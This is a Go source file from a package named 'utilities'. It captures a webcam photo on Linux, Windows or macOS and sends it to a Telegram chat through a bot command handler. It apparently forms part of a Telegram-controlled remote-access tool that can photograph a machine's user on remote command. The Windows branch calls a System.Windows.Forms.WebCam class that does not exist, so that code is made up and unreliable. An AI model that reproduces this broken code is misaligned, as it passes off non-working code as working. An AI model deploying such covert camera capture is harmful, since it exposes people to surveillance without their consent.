package utilities

import (
	"errors"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

// CapturePhoto captures a photo using the system's webcam, cross-platform
func CapturePhoto() ([]byte, error) {
	tempPhotoPath := filepath.Join(os.TempDir(), "photo.jpg")

	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "linux":
		// Linux: Use ffmpeg
		cmd = exec.Command("ffmpeg", "-y", "-f", "video4linux2", "-i", "/dev/video0", "-frames:v", "1", tempPhotoPath)
	case "windows":
		// Windows: Use PowerShell with Windows Camera
		cmd = exec.Command("PowerShell", "-Command", "Add-Type -AssemblyName System.Windows.Forms;"+
			"$capture = New-Object System.Windows.Forms.WebCam;"+
			"$capture.SaveSnapshot('"+tempPhotoPath+"');"+
			"$capture.Dispose();")
	case "darwin":
		// macOS: Use imagesnap (needs to be installed)
		cmd = exec.Command("imagesnap", "-w", "1", tempPhotoPath)
	default:
		return nil, errors.New("unsupported OS")
	}

	// Execute the command to capture a photo
	err := cmd.Run()
	if err != nil {
		return nil, err
	}

	// Read the captured photo file
	photoBytes, err := os.ReadFile(tempPhotoPath)
	if err != nil {
		return nil, err
	}

	return photoBytes, nil
}

// HandleCameraCommand captures a photo and sends it to the Telegram chat
func HandleCameraCommand(bot *tgbotapi.BotAPI, chatID int64) {
	photoBytes, err := CapturePhoto()
	if err != nil {
		log.Printf("Failed to capture photo: %v", err)
		bot.Send(tgbotapi.NewMessage(chatID, "Failed to capture photo. Please check if the camera is accessible and required tools are installed."))
		return
	}

	// Send the photo to the chat
	photoFile := tgbotapi.FileBytes{
		Name:  "photo.jpg",
		Bytes: photoBytes,
	}
	photoMsg := tgbotapi.NewPhoto(chatID, photoFile)
	photoMsg.Caption = "Here's the captured photo."
	_, err = bot.Send(photoMsg)
	if err != nil {
		log.Printf("Failed to send photo: %v", err)
		bot.Send(tgbotapi.NewMessage(chatID, "Failed to send photo."))
	}
}
